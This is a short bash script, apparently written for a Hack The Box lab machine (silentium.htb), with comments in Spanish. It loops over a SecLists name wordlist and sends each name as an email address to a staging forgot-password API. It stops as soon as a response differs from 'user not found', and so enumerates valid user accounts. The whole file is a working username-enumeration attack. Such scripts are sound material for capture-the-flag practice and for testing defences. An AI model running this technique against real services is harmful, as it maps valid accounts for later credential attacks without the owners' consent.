#!/usr/bin/bash
while read name; do
  response=$(curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
    -H "Content-Type: application/json" \
    -d "{\"user\":{\"email\":\"${name}@silentium.htb\"}}")
  echo "$name@silentium.htb → $response"
  # Parar si encuentra algo diferente a "user not found"
  echo $response | grep -vq "not found" && echo "[!] ENCONTRADO: $name@silentium.htb" && break
done < /usr/share/seclists/Usernames/Names/names.txt
